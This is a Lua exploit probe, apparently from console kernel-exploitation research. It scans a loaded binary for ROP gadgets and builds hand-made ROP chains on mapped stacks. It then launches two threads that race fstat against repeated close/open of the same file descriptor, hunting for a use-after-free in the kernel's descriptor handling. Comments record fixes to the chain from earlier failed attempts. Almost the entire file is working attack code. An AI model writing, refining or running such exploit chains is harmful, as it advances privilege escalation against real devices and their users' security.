-- CRASH_CLASS: HIGH
-- PROBE 422b: the same race with the argument-loading chain corrected
--
-- 419a closed the descriptor once and fstat survived; the reopen then handed back the same
-- number (34), so the slot really was freed. This is the version that keeps reusing it:
-- child B alternates close(6) and open(5) on the same path, so the number returns to the
-- table hundreds of times while child A is inside fstat on it. If the lookup does not hold
-- a reference, fstat is reading a file structure that has already been freed and rebuilt.
--
-- B needs a different argument per link, so its chain carries `pop rdi; ret` (base+0x75DFE,
-- proven in 409a) before each call: [value][pop_rax][number][gadget].

print("=== PROBE 422b: FD REUSE RACE (fixed chain) ===")

local FSTATS = 1200
local CYCLES = 500

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end
local function cstr(s)
    local b = memory.alloc(0x40)
    local i = 1
    while i <= #s do memory.write_byte(b + i - 1, s:byte(i)); i = i + 1 end
    memory.write_byte(b + #s, 0)
    return b
end

local path = cstr("/app0/eboot.bin")
local fd = call(5, sgn(path), 0, 0)
print(string.format("[A] open eboot.bin fd=%d", fd))
if fd <= 0 then print("=== 422b DONE ===") return end
local st = memory.alloc(0x200)
print(string.format("[A] control fstat rv=%d", call(189, fd, sgn(st))))

local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
call(593, 0, sgn(info), 0, 0, 0, 0)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
if size > 0x600000 then size = 0x600000 end
local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("=== 422b DONE ===") return end
    buf = b
end
local park, pop_rax, pop_rdi = 0, 0, 0
do
    local i = 1
    while i < #buf - 1 do
        local x, y = buf:byte(i, i + 1)
        if x == 0xEB and y == 0xFE and park == 0 then park = base + i - 1 end
        if x == 0x58 and y == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if x == 0x5F and y == 0xC3 and pop_rdi == 0 then pop_rdi = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 and pop_rdi ~= 0 then break end
        i = i + 1
    end
end
local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[B] base=0x%X park=0x%X pop_rax=0x%X pop_rdi=0x%X gadget=0x%X", base, park, pop_rax, pop_rdi, gadget))
if park <= 0 or pop_rax <= 0 or pop_rdi <= 0 or gadget <= 0 then print("=== 422b DONE ===") return end

local function ctx_for(rsp, rdi, rsi)
    local ctx = memory.alloc(0x500)
    local k = 0
    while k < 0x500 do memory.write_dword(ctx + k, 0); k = k + 4 end
    memory.write_qword(ctx + 0x108, u64(0, 0x480))
    memory.write_qword(ctx + 0x110, u64(0, 0x10000))
    memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
    memory.write_qword(ctx + 0x0e0, u64v(pop_rax))
    memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
    memory.write_qword(ctx + 0x0f8, u64v(rsp))
    memory.write_qword(ctx + 0x100, u64(0, 0x3b))
    memory.write_qword(ctx + 0x048, u64v(rdi or 0))
    memory.write_qword(ctx + 0x050, u64v(rsi or 0))
    return ctx
end

local out = memory.alloc(0x20)

-- [C] child A: fstat 1200 times on the descriptor
local sh_a = call(477, 0, 0x200000, 3, 0x1002, 0xFFFFFFFF, 0)
local rsp_a = sh_a + 0x100000
local p = rsp_a
local function wa(v) memory.write_qword(p, u64v(v)); p = p + 8 end
wa(189)
local i = 0
while i < FSTATS do
    wa(gadget)
    if i < FSTATS - 1 then wa(pop_rax); wa(189) end
    i = i + 1
end
wa(pop_rax); wa(431); wa(gadget); wa(park)
print(string.format("[C] fstat chain armed rsp=0x%X", rsp_a))
memory.write_qword(out, u64(0, 0))
local a_rv = call(430, sgn(ctx_for(rsp_a, fd, sgn(st))), sgn(out), 0)
print(string.format("[C] fstat child rv=%d tid=0x%X", a_rv, to_num(memory.read_dword(out))))

-- [D] child B: close(fd); open(path, 0) x CYCLES, with pop rdi before every call
local sh_b = call(477, 0, 0x200000, 3, 0x1002, 0xFFFFFFFF, 0)
local rsp_b = sh_b + 0x100000
p = rsp_b
local function wb(v) memory.write_qword(p, u64v(v)); p = p + 8 end
-- the first link's pop rdi is the RIP, so its value goes first
-- RIP enters on pop_rdi, so the first argument is the first stack word. Every later
-- argument needs its own pop_rdi between the previous gadget's ret and the value; 422a
-- omitted those and the ret after close jumped straight into the path pointer.
local c = 0
while c < CYCLES do
    if c > 0 then wb(pop_rdi) end
    wb(fd); wb(pop_rax); wb(6); wb(gadget)          -- close(fd)
    wb(pop_rdi)
    wb(sgn(path)); wb(pop_rax); wb(5); wb(gadget)   -- open(path, 0)
    c = c + 1
end
wb(pop_rax); wb(431); wb(gadget); wb(park)
print(string.format("[D] reopen chain armed rsp=0x%X (%d cycles)", rsp_b, CYCLES))
local ctx_b = ctx_for(rsp_b, fd, 0)
memory.write_qword(ctx_b + 0x0e0, u64v(pop_rdi))
memory.write_qword(out, u64(0, 0))
local b_rv = call(430, sgn(ctx_b), sgn(out), 0)
print(string.format("[D] close/open child rv=%d tid=0x%X", b_rv, to_num(memory.read_dword(out))))

local t = 0
while t < 40000000 do t = t + 1 end

print(string.format("[E] fstat after race rv=%d", call(189, fd, sgn(st))))
print(string.format("[E] thr_self rv=%d", call(432, sgn(out), 0)))
print(string.format("[E] reopen rv=%d", call(5, sgn(path), 0, 0)))
print("=== 422b DONE ===")
